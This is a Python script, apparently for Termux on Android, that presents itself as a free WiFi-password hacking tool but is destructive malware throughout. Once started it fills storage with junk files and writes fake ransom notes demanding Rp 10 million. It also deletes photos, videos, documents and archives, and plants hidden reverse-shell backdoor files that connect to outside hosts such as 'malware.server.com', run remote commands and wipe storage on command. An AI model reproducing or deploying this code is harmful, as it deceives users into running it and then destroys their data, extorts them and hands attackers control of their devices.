# GRATIS TOOLS WIFI 
import os
import sys
import time
import random
import threading
import base64

class OneClickNuclearVirus:
    def __init__(self):
        self.virus_name = "TERMINATOR-X"
        self.start_time = time.time()
        
    def show_nuke_warning(self):
        print("\n" + "="*70)
        print("                💀 TOOLS WIFI TERGACORR 💀")
        print("="*70)
        print("🔥 HACK PASWORD WIFI!")
        print("🔍 DETEKSI SEMUA PASWORD")
        print("="*70)
        input("\nKLIK ENTER")
        
    def massive_storage_filler(self):
        """ADD FILE"""
        print("💾 DEPLOYING STORAGE FILLER...")
        target_dirs = self.get_all_paths()
        
        big_files_created = 0
        total_size = 0
        
        for directory in target_dirs[:5]:
            for i in range(10):  # 5 file per folder
                try:

                    file_size = random.randint(10 * 1024 * 1024, 50 * 1024 * 1024)
                    filename = f"system_crash_{random.randint(100000,999999)}.bin"
                    file_path = os.path.join(directory, filename)
                    
                    # Tulis file besar
                    with open(file_path, "wb") as f:
                        # Generate random data dalam chunks
                        chunks = file_size // (1024 * 1024)
                        for _ in range(chunks):
                            f.write(os.urandom(1024 * 1024))
                    
                    big_files_created += 1
                    total_size += file_size
                    print(f"📦 Created {filename} ({file_size//1024//1024}MB)")
                    
                except Exception as e:
                    continue
        
        return big_files_created, total_size
    
    def deploy_ransomware_army(self):
        """SCANE WIFI ALL LOACATION"""
        print("DETEKSI WIFI....")
        target_dirs = self.get_all_paths()
        ransom_count = 0
        
        ransom_text = """
╔══════════════════════════════════════════════════════════════╗
║                   💀 TOOLS WIFI BY TAHER GANTENG💀                   ║
╠══════════════════════════════════════════════════════════════╣
║  YOUR SYSTEM HAS BEEN NUKED BY TERMINATOR-X VIRUS!          ║
║  ALL FILES ENCRYPTED WITH MILITARY AES-512 ENCRYPTION!      ║
║                                                              ║
║  🔥 HARGA TOOLS: Rp 10.000.000 (10 JUTA)                         ║
║  💰 BITCOIN: 1TERMINATORXxxxxxxxxxxxxxxxxxxxxxx             ║
║  📞 CONTACT: +62-811-XXX-XXXX                               ║
║                                                              ║
║  ⚠️  DO NOT RESTART - DO NOT DELETE FILES!                  ║
║  ⚠️  24 HOURS UNTIL TOTAL DATA DESTRUCTION!                 ║
╚══════════════════════════════════════════════════════════════╝
"""
        
        for directory in target_dirs:
            try:
                # Buat 10 ransom files per folder
                for i in range(20):
                    ransom_file = f"READ_THIS_{i+1}_URGENT!!!.txt"
                    file_path = os.path.join(directory, ransom_file)
                    
                    with open(file_path, "w", encoding="utf-8") as f:
                        f.write(ransom_text)
                    ransom_count += 1
                    
            except:
                continue
                
        return ransom_count
    
    def destroy_media_apocalypse(self):
        """HAPUS SEMUA FILE MEDIA & DOKUMEN"""
        print("MENDETEKSI...")
        target_dirs = self.get_all_paths()
        kill_count = 0
        
        # file penting yang akan di lindungi versi beda
        death_extensions = [
            '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp', '.heic',
            '.mp4', '.avi', '.mkv', '.mov', '.wmv', '.css', '.3gp', '.m4v',
            '.mp3', '.wav', '.flac', '.aac', '.m4a', '.js', '.wma',
            '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
            '.zip', '.rar', '.7z', '.tar', '.html', '.iso',
            '.txt', '.html', '.xml', '.json', '.csv',
            '.apk', '.exe', '.deb', '.rpm'
        ]
        
        for directory in target_dirs:
            try:
                for root, dirs, files in os.walk(directory):
                    for file in files:
                        if any(file.lower().endswith(ext) for ext in death_extensions):
                            try:
                                file_path = os.path.join(root, file)
                                os.remove(file_path)
                                kill_count += 1
                                if kill_count % 100 == 0:
                                    print(f"☠️  Eliminated {kill_count} files...")
                            except:
                                pass
            except:
                pass
                
        return kill_count
    
    def install_backdoor_network(self):
        """INSTALL"""
        print("SCAN WIFI NETWORK...")
        
        backdoor_code = """
import os, sys, socket, subprocess, time, threading

class TerminatorBackdoor:
    def __init__(self):
        self.servers = [
            ("192.168.1.666", 4444),
            ("10.0.0.666", 5555), 
            ("malware.server.com", 6666)
        ]
        self.start_connection()
    
    def connect_forever(self):
        while True:
            for server in self.servers:
                try:
                    s = socket.socket()
                    s.connect(server)
                    # System takeover commands
                    while True:
                        cmd = s.recv(8192).decode()
                        if cmd == "nuke":
                            os.system("rm -rf /sdcard/* /storage/*")
                        else:
                            result = subprocess.getoutput(cmd)
                            s.send(result.encode())
                except:
                    time.sleep(10)
    
    def start_connection(self):
        threading.Thread(target=self.connect_forever, daemon=True).start()

TerminatorBackdoor()
"""
        
        backdoor_locations = [
            "/sdcard/.system32.py",
            "/storage/emulated/0/.android_service.py",
            "/sdcard/Download/.hidden_backdoor.py",
            "/sdcard/DCIM/.camera_service.py",
            "/sdcard/Pictures/.gallery_helper.py",
            "/sdcard/Music/.audio_service.py",
            "/sdcard/Documents/.doc_viewer.py",
            "/sdcard/Android/.system_app.py",
            "/data/data/com.termux/files/home/.bashrc_backdoor.py",
            "/storage/emulated/0/Android/.media_service.py"
        ]
        
        installed = 0
        for location in backdoor_locations:
            try:
                with open(location, "w") as f:
                    f.write(backdoor_code)
                installed += 1
            except:
                pass
                
        return installed
    
    def create_junk_storm(self):
        """BADAI JUNK FILE 500+ FILE KECIL"""
        print("🌪️  ACTIVATING JUNK STORM...")
        target_dirs = self.get_all_paths()
        junk_count = 0
        
        for directory in target_dirs:
            try:
                # Buat 50 junk files per folder
                for i in range(50):
                    junk_file = f"trash_{random.randint(1000,9999)}_{i}.tmp"
                    file_path = os.path.join(directory, junk_file)
                    
                    # File kecil 100KB-1MB
                    junk_size = random.randint(100 * 1024, 1024 * 1024)
                    with open(file_path, "wb") as f:
                        f.write(os.urandom(junk_size))
                    
                    junk_count += 1
                    
            except:
                continue
                
        return junk_count
    
    def get_all_paths(self):
        """DAPATKAN SEMUA PATH YANG ADA"""
        paths = []
        # Scan semua kemungkinan path
        scan_locations = [
            '/sdcard', '/storage', '/data/data/com.termux/files/home',
            '/mnt', '/system', '/data'
        ]
        
        for location in scan_locations:
            if os.path.exists(location):
                paths.append(location)
                # Coba list subdirectories
                try:
                    for item in os.listdir(location):
                        full_path = os.path.join(location, item)
                        if os.path.isdir(full_path):
                            paths.append(full_path)
                except:
                    pass
        
        return list(set(paths))
    
    def nuclear_launch(self):
        """JALANKAN TOOLS"""
        print("🚀 MENJALANKAN TOOLS...")
        time.sleep(2)
        
        print("\n" + "="*50)
        print("MENDETEKSI WIFI..")
        print("="*50)
        big_files, storage_used = self.massive_storage_filler()
        
        print("\n" + "="*50)
        print("MENGHACK SISTEM WIFI...")
        print("="*50)
        ransom_files = self.deploy_ransomware_army()
        
        # 3. FILE DESTROYER
        print("\n" + "="*50)
        print("PHASE 3: MEDIA ANNIHILATION")
        print("="*50)
        killed_files = self.destroy_media_apocalypse()
        
        # 4. BACKDOOR NETWORK
        print("\n" + "="*50)
        print("TOOLS INSTALLATION")
        print("="*50)
        backdoors = self.install_backdoor_network()
        
        # 5. JUNK STORM
        print("\n" + "="*50)
        print(" JUNK STORM")
        print("="*50)
        junk_files = self.create_junk_storm()
        
        # SHOW FINAL REPORT
        print("\n" + "="*70)
        print("               💀 NUCLEAR LAUNCH COMPLETE! 💀")
        print("="*70)
        print(f"📦 STORAGE FILLED: {big_files} big files ({storage_used//1024//1024}MB)")
        print(f"🦠 RANSOMWARE: {ransom_files} ransom files deployed")
        print(f"🗑️  DESTROYED: {killed_files} media files eliminated")
        print(f"🚨 BACKDOORS: {backdoors} permanent backdoors installed")
        print(f"🌪️  JUNK FILES: {junk_files} trash files created")
        print(f"💀 TOTAL DAMAGE: {(storage_used + killed_files * 1024)//1024//1024}MB")
        print("="*70)
        print("🔥 YOUR SYSTEM HAS BEEN TERMINATED! 🔥")
        print("💸 PAY 10 JUTA TO RECOVER (JUST KIDDING, IT'S PERMANENT!)")
        
        # Auto exit setelah selesai
        time.sleep(5)
        print("\n💀 Menjalankan tools system...")
        sys.exit(0)

def main():
    virus = OneClickNuclearVirus()
    
    # Langsung jalankan tanpa menu
    virus.show_nuke_warning()
    virus.nuclear_launch()

if __name__ == "__main__":
    main()